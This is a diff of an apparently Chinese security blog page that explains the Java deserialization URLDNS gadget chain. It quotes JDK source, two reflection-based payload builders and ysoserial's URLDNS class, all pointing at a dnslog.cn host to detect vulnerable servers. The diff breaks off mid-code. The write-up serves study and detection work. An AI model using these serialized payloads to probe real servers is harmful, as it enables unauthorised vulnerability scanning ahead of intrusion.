+</code></pre></div><p>可以知道，readObject方法会获取有多少个数据，而后进行通过for循环循环从数据流中读取对象信息，并通过putVal方法加入到HashMap中，其中键为<code>hash(key)</code>，也就是会尝试调用key对应类的hashCode方法计算hash值。</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java>    <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>final</span> <span style=color:#66d9ef>int</span> <span style=color:#a6e22e>hash</span><span style=color:#f92672>(</span>Object key<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
+        <span style=color:#66d9ef>int</span> h<span style=color:#f92672>;</span>
+        <span style=color:#66d9ef>return</span> <span style=color:#f92672>(</span>key <span style=color:#f92672>==</span> <span style=color:#66d9ef>null</span><span style=color:#f92672>)</span> <span style=color:#f92672>?</span> 0 <span style=color:#f92672>:</span> <span style=color:#f92672>(</span>h <span style=color:#f92672>=</span> key<span style=color:#f92672>.</span><span style=color:#a6e22e>hashCode</span><span style=color:#f92672>())</span> <span style=color:#f92672>^</span> <span style=color:#f92672>(</span>h <span style=color:#f92672>&gt;&gt;&gt;</span> 16<span style=color:#f92672>);</span>
+    <span style=color:#f92672>}</span>
+</code></pre></div><p>如果key对象为URL类，通过前面我们知道URL.hashCode方法会触发DNS请求，这也是URLDNS的原理。</p>
+<p><em>以上代码来源于JDK 12.0.1</em></p>
+<blockquote>
+<p>
+<a href=https://cloud.tencent.com/developer/article/1167574 target=_blank>https://cloud.tencent.com/developer/article/1167574</a></p>
+<p>
+<a href=https://anmolsehgal.medium.com/java-hashmap-internal-implementation-21597e1efec3 target=_blank>https://anmolsehgal.medium.com/java-hashmap-internal-implementation-21597e1efec3</a></p>
+</blockquote>
+<p><strong>实际测试</strong></p>
+<p>使用如下代码进行测试</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>urltest</span> <span style=color:#f92672>{</span>
+    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>main</span><span style=color:#f92672>(</span>String<span style=color:#f92672>[]</span> args<span style=color:#f92672>)</span> <span style=color:#66d9ef>throws</span> IOException<span style=color:#f92672>,</span> ClassNotFoundException <span style=color:#f92672>{</span>
+        System<span style=color:#f92672>.</span><span style=color:#a6e22e>out</span><span style=color:#f92672>.</span><span style=color:#a6e22e>println</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;hello &#34;</span><span style=color:#f92672>);</span>
+        URL u <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> URL<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;http://www.baidu.com/1&#34;</span><span style=color:#f92672>);</span>
+        URL u1 <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> URL<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;http://www.aliyun.com/1&#34;</span><span style=color:#f92672>);</span>
+        HashMap<span style=color:#f92672>&lt;</span>URL<span style=color:#f92672>,</span>String<span style=color:#f92672>&gt;</span> map <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> HashMap<span style=color:#f92672>&lt;</span>URL<span style=color:#f92672>,</span>String<span style=color:#f92672>&gt;();</span>
+        map<span style=color:#f92672>.</span><span style=color:#a6e22e>put</span><span style=color:#f92672>(</span>u<span style=color:#f92672>,</span><span style=color:#e6db74>&#34;1&#34;</span><span style=color:#f92672>);</span>
+        map<span style=color:#f92672>.</span><span style=color:#a6e22e>put</span><span style=color:#f92672>(</span>u1<span style=color:#f92672>,</span><span style=color:#e6db74>&#34;1&#34;</span><span style=color:#f92672>);</span>
+
+        FileOutputStream fos <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> FileOutputStream<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;object&#34;</span><span style=color:#f92672>);</span>
+        ObjectOutputStream os <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ObjectOutputStream<span style=color:#f92672>(</span>fos<span style=color:#f92672>);</span>
+        <span style=color:#75715e>//writeObject()方法将myObj对象写入object文件
+</span><span style=color:#75715e></span>        os<span style=color:#f92672>.</span><span style=color:#a6e22e>writeObject</span><span style=color:#f92672>(</span>map<span style=color:#f92672>);</span>
+        os<span style=color:#f92672>.</span><span style=color:#a6e22e>close</span><span style=color:#f92672>();</span>
+        <span style=color:#75715e>//从文件中反序列化obj对象
+</span><span style=color:#75715e></span>        FileInputStream fis <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> FileInputStream<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;object&#34;</span><span style=color:#f92672>);</span>
+        ObjectInputStream ois <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ObjectInputStream<span style=color:#f92672>(</span>fis<span style=color:#f92672>);</span>
+        <span style=color:#75715e>//恢复对象
+</span><span style=color:#75715e></span>        HashMap map2 <span style=color:#f92672>=</span> <span style=color:#f92672>(</span>HashMap<span style=color:#f92672>&lt;</span>URL<span style=color:#f92672>,</span>String<span style=color:#f92672>&gt;)</span>ois<span style=color:#f92672>.</span><span style=color:#a6e22e>readObject</span><span style=color:#f92672>();</span>
+        System<span style=color:#f92672>.</span><span style=color:#a6e22e>out</span><span style=color:#f92672>.</span><span style=color:#a6e22e>println</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;finish&#34;</span><span style=color:#f92672>);</span>
+        ois<span style=color:#f92672>.</span><span style=color:#a6e22e>close</span><span style=color:#f92672>();</span>
+    <span style=color:#f92672>}</span>
+<span style=color:#f92672>}</span>
+</code></pre></div><p>实际测试在从文件中反序列化恢复HashMap对象时不会触发DNS查询，跟进HashMap的readObject，有如下</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java>            <span style=color:#66d9ef>for</span> <span style=color:#f92672>(</span><span style=color:#66d9ef>int</span> i <span style=color:#f92672>=</span> 0<span style=color:#f92672>;</span> i <span style=color:#f92672>&lt;</span> mappings<span style=color:#f92672>;</span> i<span style=color:#f92672>++)</span> <span style=color:#f92672>{</span>
+                <span style=color:#a6e22e>@SuppressWarnings</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;unchecked&#34;</span><span style=color:#f92672>)</span>
+                    K key <span style=color:#f92672>=</span> <span style=color:#f92672>(</span>K<span style=color:#f92672>)</span> s<span style=color:#f92672>.</span><span style=color:#a6e22e>readObject</span><span style=color:#f92672>();</span>
+                <span style=color:#a6e22e>@SuppressWarnings</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;unchecked&#34;</span><span style=color:#f92672>)</span>
+                    V value <span style=color:#f92672>=</span> <span style=color:#f92672>(</span>V<span style=color:#f92672>)</span> s<span style=color:#f92672>.</span><span style=color:#a6e22e>readObject</span><span style=color:#f92672>();</span>
+                putVal<span style=color:#f92672>(</span>hash<span style=color:#f92672>(</span>key<span style=color:#f92672>),</span> key<span style=color:#f92672>,</span> value<span style=color:#f92672>,</span> <span style=color:#66d9ef>false</span><span style=color:#f92672>,</span> <span style=color:#66d9ef>false</span><span style=color:#f92672>);</span>
+            <span style=color:#f92672>}</span>
+</code></pre></div><p>其中对K尝试调用readObject方法反序列化出对应的对象，其会调用到URL类的readObject方法，可以看到URL的readObject方法会尝试读取到hashCode并放入对象的hashCode属性</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java>    <span style=color:#66d9ef>private</span> <span style=color:#66d9ef>synchronized</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>readObject</span><span style=color:#f92672>(</span>java<span style=color:#f92672>.</span><span style=color:#a6e22e>io</span><span style=color:#f92672>.</span><span style=color:#a6e22e>ObjectInputStream</span> s<span style=color:#f92672>)</span>
+            <span style=color:#66d9ef>throws</span> IOException<span style=color:#f92672>,</span> ClassNotFoundException <span style=color:#f92672>{</span>
+        GetField gf <span style=color:#f92672>=</span> s<span style=color:#f92672>.</span><span style=color:#a6e22e>readFields</span><span style=color:#f92672>();</span>
+        String protocol <span style=color:#f92672>=</span> <span style=color:#f92672>(</span>String<span style=color:#f92672>)</span>gf<span style=color:#f92672>.</span><span style=color:#a6e22e>get</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;protocol&#34;</span><span style=color:#f92672>,</span> <span style=color:#66d9ef>null</span><span style=color:#f92672>);</span>
+        <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>getURLStreamHandler<span style=color:#f92672>(</span>protocol<span style=color:#f92672>)</span> <span style=color:#f92672>==</span> <span style=color:#66d9ef>null</span><span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
+            <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> IOException<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;unknown protocol: &#34;</span> <span style=color:#f92672>+</span> protocol<span style=color:#f92672>);</span>
+        <span style=color:#f92672>}</span>
+        String host <span style=color:#f92672>=</span> <span style=color:#f92672>(</span>String<span style=color:#f92672>)</span>gf<span style=color:#f92672>.</span><span style=color:#a6e22e>get</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;host&#34;</span><span style=color:#f92672>,</span> <span style=color:#66d9ef>null</span><span style=color:#f92672>);</span>
+        <span style=color:#66d9ef>int</span> port <span style=color:#f92672>=</span> gf<span style=color:#f92672>.</span><span style=color:#a6e22e>get</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;port&#34;</span><span style=color:#f92672>,</span> <span style=color:#f92672>-</span>1<span style=color:#f92672>);</span>
+        String authority <span style=color:#f92672>=</span> <span style=color:#f92672>(</span>String<span style=color:#f92672>)</span>gf<span style=color:#f92672>.</span><span style=color:#a6e22e>get</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;authority&#34;</span><span style=color:#f92672>,</span> <span style=color:#66d9ef>null</span><span style=color:#f92672>);</span>
+        String file <span style=color:#f92672>=</span> <span style=color:#f92672>(</span>String<span style=color:#f92672>)</span>gf<span style=color:#f92672>.</span><span style=color:#a6e22e>get</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;file&#34;</span><span style=color:#f92672>,</span> <span style=color:#66d9ef>null</span><span style=color:#f92672>);</span>
+        String ref <span style=color:#f92672>=</span> <span style=color:#f92672>(</span>String<span style=color:#f92672>)</span>gf<span style=color:#f92672>.</span><span style=color:#a6e22e>get</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;ref&#34;</span><span style=color:#f92672>,</span> <span style=color:#66d9ef>null</span><span style=color:#f92672>);</span>
+        <span style=color:#66d9ef>int</span> hashCode <span style=color:#f92672>=</span> gf<span style=color:#f92672>.</span><span style=color:#a6e22e>get</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;hashCode&#34;</span><span style=color:#f92672>,</span> <span style=color:#f92672>-</span>1<span style=color:#f92672>);</span>
+        <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>authority <span style=color:#f92672>==</span> <span style=color:#66d9ef>null</span>
+                <span style=color:#f92672>&amp;&amp;</span> <span style=color:#f92672>((</span>host <span style=color:#f92672>!=</span> <span style=color:#66d9ef>null</span> <span style=color:#f92672>&amp;&amp;</span> <span style=color:#f92672>!</span>host<span style=color:#f92672>.</span><span style=color:#a6e22e>isEmpty</span><span style=color:#f92672>())</span> <span style=color:#f92672>||</span> port <span style=color:#f92672>!=</span> <span style=color:#f92672>-</span>1<span style=color:#f92672>))</span> <span style=color:#f92672>{</span>
+            <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>host <span style=color:#f92672>==</span> <span style=color:#66d9ef>null</span><span style=color:#f92672>)</span>
+                host <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;&#34;</span><span style=color:#f92672>;</span>
+            authority <span style=color:#f92672>=</span> <span style=color:#f92672>(</span>port <span style=color:#f92672>==</span> <span style=color:#f92672>-</span>1<span style=color:#f92672>)</span> <span style=color:#f92672>?</span> host <span style=color:#f92672>:</span> host <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;:&#34;</span> <span style=color:#f92672>+</span> port<span style=color:#f92672>;</span>
+        <span style=color:#f92672>}</span>
+        tempState <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> UrlDeserializedState<span style=color:#f92672>(</span>protocol<span style=color:#f92672>,</span> host<span style=color:#f92672>,</span> port<span style=color:#f92672>,</span> authority<span style=color:#f92672>,</span>
+               file<span style=color:#f92672>,</span> ref<span style=color:#f92672>,</span> hashCode<span style=color:#f92672>);</span>
+    <span style=color:#f92672>}</span>
+</code></pre></div><p>而在序列化时，会调用HashMap.put方法，put方法会跟前面一样，调用hash方法计算hashCode，并放到对象内，序列化时hashCode就被保存了。</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java>    <span style=color:#66d9ef>public</span> V <span style=color:#a6e22e>put</span><span style=color:#f92672>(</span>K key<span style=color:#f92672>,</span> V value<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
+        <span style=color:#66d9ef>return</span> putVal<span style=color:#f92672>(</span>hash<span style=color:#f92672>(</span>key<span style=color:#f92672>),</span> key<span style=color:#f92672>,</span> value<span style=color:#f92672>,</span> <span style=color:#66d9ef>false</span><span style=color:#f92672>,</span> <span style=color:#66d9ef>true</span><span style=color:#f92672>);</span>
+    <span style=color:#f92672>}</span>
+</code></pre></div><p>使得在调用URL.readObject方法时能够获取到hashCode，不会进行DNS解析。要解决这个问题就得让序列化后的数据hashCode为-1才能让hashCode方法调用到getHostAddress方法。
+容易想到两种办法</p>
+<ol>
+<li>在put后，修改数据，把hashCode对应的数据置为-1，而后进行序列化</li>
+<li>在数据放入HashMap时，通过反射直接调用putVal并把第一个参数设为-1
 以下是两种办法的实现，
-<a href=https://su18.org/post/ysoserial-su18-1/?#%E5%9B%9B-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-gadget-%E5%88%86%E6%9E%90 target=_blank>来源于</a></li></ol><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>URLDNS</span> {
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>	<span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>main</span>(String<span style=color:#f92672>[]</span> args) <span style=color:#66d9ef>throws</span> Exception {
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>		HashMap<span style=color:#f92672>&lt;</span>URL, Integer<span style=color:#f92672>&gt;</span> hashMap <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> HashMap<span style=color:#f92672>&lt;&gt;</span>();
-</span></span><span style=display:flex><span>		URL                   url     <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> URL(<span style=color:#e6db74>&#34;http://su18.dnslog.cn&#34;</span>);
-</span></span><span style=display:flex><span>		Field                 f       <span style=color:#f92672>=</span> Class.<span style=color:#a6e22e>forName</span>(<span style=color:#e6db74>&#34;java.net.URL&#34;</span>).<span style=color:#a6e22e>getDeclaredField</span>(<span style=color:#e6db74>&#34;hashCode&#34;</span>);
-</span></span><span style=display:flex><span>		f.<span style=color:#a6e22e>setAccessible</span>(<span style=color:#66d9ef>true</span>);
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>		f.<span style=color:#a6e22e>set</span>(url, 0x01010101);
-</span></span><span style=display:flex><span>		hashMap.<span style=color:#a6e22e>put</span>(url, 0);
-</span></span><span style=display:flex><span>		f.<span style=color:#a6e22e>set</span>(url, <span style=color:#f92672>-</span>1);
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>		ObjectOutputStream oos <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ObjectOutputStream(<span style=color:#66d9ef>new</span> FileOutputStream(<span style=color:#e6db74>&#34;urldns.bin&#34;</span>));
-</span></span><span style=display:flex><span>		oos.<span style=color:#a6e22e>writeObject</span>(hashMap);
-</span></span><span style=display:flex><span>		ObjectInputStream ois <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ObjectInputStream(<span style=color:#66d9ef>new</span> FileInputStream(<span style=color:#e6db74>&#34;urldns.bin&#34;</span>));
-</span></span><span style=display:flex><span>		ois.<span style=color:#a6e22e>readObject</span>();
-</span></span><span style=display:flex><span>	}
-</span></span><span style=display:flex><span>}
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>URLDNS2</span> {
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>	<span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>main</span>(String<span style=color:#f92672>[]</span> args) <span style=color:#66d9ef>throws</span> Exception {
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>		HashMap<span style=color:#f92672>&lt;</span>URL, Integer<span style=color:#f92672>&gt;</span> hashMap <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> HashMap<span style=color:#f92672>&lt;&gt;</span>();
-</span></span><span style=display:flex><span>		URL                   url     <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> URL(<span style=color:#e6db74>&#34;http://su18.dnslog.cn&#34;</span>);
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>		Method<span style=color:#f92672>[]</span> m <span style=color:#f92672>=</span> Class.<span style=color:#a6e22e>forName</span>(<span style=color:#e6db74>&#34;java.util.HashMap&#34;</span>).<span style=color:#a6e22e>getDeclaredMethods</span>();
-</span></span><span style=display:flex><span>		<span style=color:#66d9ef>for</span> (Method method : m) {
-</span></span><span style=display:flex><span>			<span style=color:#66d9ef>if</span> (method.<span style=color:#a6e22e>getName</span>().<span style=color:#a6e22e>equals</span>(<span style=color:#e6db74>&#34;putVal&#34;</span>)) {
-</span></span><span style=display:flex><span>				method.<span style=color:#a6e22e>setAccessible</span>(<span style=color:#66d9ef>true</span>);
-</span></span><span style=display:flex><span>				method.<span style=color:#a6e22e>invoke</span>(hashMap, <span style=color:#f92672>-</span>1, url, 0, <span style=color:#66d9ef>false</span>, <span style=color:#66d9ef>true</span>);
-</span></span><span style=display:flex><span>			}
-</span></span><span style=display:flex><span>		}
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>		ObjectOutputStream oos <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ObjectOutputStream(<span style=color:#66d9ef>new</span> FileOutputStream(<span style=color:#e6db74>&#34;urldns2.bin&#34;</span>));
-</span></span><span style=display:flex><span>		oos.<span style=color:#a6e22e>writeObject</span>(hashMap);
-</span></span><span style=display:flex><span>		ObjectInputStream ois <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ObjectInputStream(<span style=color:#66d9ef>new</span> FileInputStream(<span style=color:#e6db74>&#34;urldns2.bin&#34;</span>));
-</span></span><span style=display:flex><span>		ois.<span style=color:#a6e22e>readObject</span>();
-</span></span><span style=display:flex><span>	}
-</span></span><span style=display:flex><span>}
-</span></span></code></pre></div><h4 id=ysoserial-实现url-dns>ysoserial 实现URL DNS</h4><p>下载
-<a href=https://github.com/frohoff/ysoserial target=_blank>源码</a>,URLDNS实现如下，很明显采用的时第一种方法，在put之后，通过反射修改对应的值。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>URLDNS</span> <span style=color:#66d9ef>implements</span> ObjectPayload<span style=color:#f92672>&lt;</span>Object<span style=color:#f92672>&gt;</span> {
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>        <span style=color:#66d9ef>public</span> Object <span style=color:#a6e22e>getObject</span>(<span style=color:#66d9ef>final</span> String url) <span style=color:#66d9ef>throws</span> Exception {
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>                <span style=color:#75715e>//Avoid DNS resolution during payload creation</span>
-</span></span><span style=display:flex><span>                <span style=color:#75715e>//Since the field &lt;code&gt;java.net.URL.handler&lt;/code&gt; is transient, it will not be part of the serialized payload.</span>
-</span></span><span style=display:flex><span>                URLStreamHandler handler <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> SilentURLStreamHandler();
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>                HashMap ht <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> HashMap(); <span style=color:#75715e>// HashMap that will contain the URL</span>
-</span></span><span style=display:flex><span>                URL u <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> URL(<span style=color:#66d9ef>null</span>, url, handler); <span style=color:#75715e>// URL to use as the Key</span>
-</span></span><span style=display:flex><span>                ht.<span style=color:#a6e22e>put</span>(u, url); <span style=color:#75715e>//The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.</span>
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>                Reflections.<span style=color:#a6e22e>setFieldValue</span>(u, <span style=color:#e6db74>&#34;hashCode&#34;</span>, <span style=color:#f92672>-</span>1); <span style=color:#75715e>// During the put above, the URL&#39;s hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.</span>
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>                <span style=color:#66d9ef>return</span> ht;
-</span></span><span style=display:flex><span>        }
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>        <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>main</span>(<span style=color:#66d9ef>final</span> String<span style=color:#f92672>[]</span> args) <span style=color:#66d9ef>throws</span> Exception {
-</span></span><span style=display:flex><span>                PayloadRunner.<span style=color:#a6e22e>run</span>(URLDNS.<span style=color:#a6e22e>class</span>, args);
-</span></span><span style=display:flex><span>        }
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>        <span style=color:#75715e>/**
-</span></span></span><span style=display:flex><span><span style=color:#75715e>         * &lt;p&gt;This instance of URLStreamHandler is used to avoid any DNS resolution while creating the URL instance.
-</span></span></span><span style=display:flex><span><span style=color:#75715e>         * DNS resolution is used for vulnerability detection. It is important not to probe the given URL prior
-</span></span></span><span style=display:flex><span><span style=color:#75715e>         * using the serialized object.&lt;/p&gt;
-</span></span></span><span style=display:flex><span><span style=color:#75715e>         *
-</span></span></span><span style=display:flex><span><span style=color:#75715e>         * &lt;b&gt;Potential false negative:&lt;/b&gt;
-</span></span></span><span style=display:flex><span><span style=color:#75715e>         * &lt;p&gt;If the DNS name is resolved first from the tester computer, the targeted server might get a cache hit on the
-</span></span></span><span style=display:flex><span><span style=color:#75715e>         * second resolution.&lt;/p&gt;
-</span></span></span><span style=display:flex><span><span style=color:#75715e>         */</span>
-</span></span><span style=display:flex><span>        <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>SilentURLStreamHandler</span> <span style=color:#66d9ef>extends</span> URLStreamHandler {
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>                <span style=color:#66d9ef>protected</span> URLConnection <span style=color:#a6e22e>openConnection</span>(URL u) <span style=color:#66d9ef>throws</span> IOException {
-</span></span><span style=display:flex><span>                        <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>null</span>;
-</span></span><span style=display:flex><span>                }
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>                <span style=color:#66d9ef>protected</span> <span style=color:#66d9ef>synchronized</span> InetAddress <span style=color:#a6e22e>getHostAddress</span>(URL u) {
-</span></span><span style=display:flex><span>                        <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>null</span>;
-</span></span><span style=display:flex><span>                }
-</span></span><span style=display:flex><span>        }
-</span></span><span style=display:flex><span>}
-</span></span><span style=display:flex><span>	<span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>setFieldValue</span>(<span style=color:#66d9ef>final</span> Object obj, <span style=color:#66d9ef>final</span> String fieldName, <span style=color:#66d9ef>final</span> Object value) <span style=color:#66d9ef>throws</span> Exception {
-</span></span><span style=display:flex><span>		<span style=color:#66d9ef>final</span> Field field <span style=color:#f92672>=</span> getField(obj.<span style=color:#a6e22e>getClass</span>(), fieldName);
-</span></span><span style=display:flex><span>		field.<span style=color:#a6e22e>set</span>(obj, value);
-</span></span><span style=display:flex><span>	}
-</span></span></code></pre></div><p><strong>参考链接</strong></p><blockquote><p><a href=https://blog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/ target=_blank>https://blog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/</a></p><p><a href=https://su18.org/post/ysoserial-su18-1/#%E5%9B%9B-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-gadget-%E5%88%86%E6%9E%90 target=_blank>https://su18.org/post/ysoserial-su18-1/#%E5%9B%9B-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-gadget-%E5%88%86%E6%9E%90</a></p></blockquote><p><strong>Created at 2024-01-08T16:57:37+08:00</strong></p><div class=last_mod>创建于:Monday, January 8,2024</div><div class=last_mod>最后修改于: Monday, January 8,2024</div><div class=article-container></div><script src=https://utteranc.es/client.js repo=CppXL/blog_comment issue-term=pathname theme=github-light crossorigin=anonymous async></script></div><div id=comments></div><footer class=footline></footer></div></div><div id=navigation><a class="nav nav-prev" href=/zh-cn/research/web/java-deserialization/commonsbeanutils1-chain/ title="CommonsBeanutils1 Chain"><i class="fa fa-chevron-left"></i></a>
-<a class="nav nav-next" href=/zh-cn/research/web/php-filter-rce/ title="PHP Filter RCE 分析" style=margin-right:0><i class="fa fa-chevron-right"></i></a></div></section><div style=left:-1000px;overflow:scroll;position:absolute;top:-1000px;border:none;box-sizing:content-box;height:200px;margin:0;padding:0;width:200px><div style=border:none;box-sizing:content-box;height:200px;margin:0;padding:0;width:200px></div></div><script src=/js/clipboard.min.js?1706695144></script><script src=/js/perfect-scrollbar.min.js?1706695144></script><script src=/js/perfect-scrollbar.jquery.min.js?1706695144></script><script src=/js/jquery.sticky.js?1706695144></script><script src=/js/featherlight.min.js?1706695144></script><script src=/js/highlight.pack.js?1706695144></script><script>hljs.initHighlightingOnLoad()</script><script src=/js/modernizr.custom-3.6.0.js?1706695144></script><script src=/js/learn.js?1706695144></script><script src=/js/hugo-learn.js?1706695144></script><script src=/mermaid/mermaid.js?1706695144></script><script>mermaid.initialize({startOnLoad:!0})</script><script>(function(e,t,n,s,o,i,a){e.GoogleAnalyticsObject=o,e[o]=e[o]||function(){(e[o].q=e[o].q||[]).push(arguments)},e[o].l=1*new Date,i=t.createElement(n),a=t.getElementsByTagName(n)[0],i.async=1,i.src=s,a.parentNode.insertBefore(i,a)})(window,document,"script","https://www.google-analytics.com/analytics.js","ga"),ga("create","UA-105947713-1","auto"),ga("send","pageview")</script></body></html>
+<a href=https://su18.org/post/ysoserial-su18-1/?#%E5%9B%9B-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-gadget-%E5%88%86%E6%9E%90 target=_blank>来源于</a></li>
+</ol>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>URLDNS</span> <span style=color:#f92672>{</span>
+
+	<span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>main</span><span style=color:#f92672>(</span>String<span style=color:#f92672>[]</span> args<span style=color:#f92672>)</span> <span style=color:#66d9ef>throws</span> Exception <span style=color:#f92672>{</span>
+
+		HashMap<span style=color:#f92672>&lt;</span>URL<span style=color:#f92672>,</span> Integer<span style=color:#f92672>&gt;</span> hashMap <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> HashMap<span style=color:#f92672>&lt;&gt;();</span>
+		URL                   url     <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> URL<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;http://su18.dnslog.cn&#34;</span><span style=color:#f92672>);</span>
+		Field                 f       <span style=color:#f92672>=</span> Class<span style=color:#f92672>.</span><span style=color:#a6e22e>forName</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;java.net.URL&#34;</span><span style=color:#f92672>).</span><span style=color:#a6e22e>getDeclaredField</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;hashCode&#34;</span><span style=color:#f92672>);</span>
+		f<span style=color:#f92672>.</span><span style=color:#a6e22e>setAccessible</span><span style=color:#f92672>(</span><span style=color:#66d9ef>true</span><span style=color:#f92672>);</span>
+
+		f<span style=color:#f92672>.</span><span style=color:#a6e22e>set</span><span style=color:#f92672>(</span>url<span style=color:#f92672>,</span> 0x01010101<span style=color:#f92672>);</span>
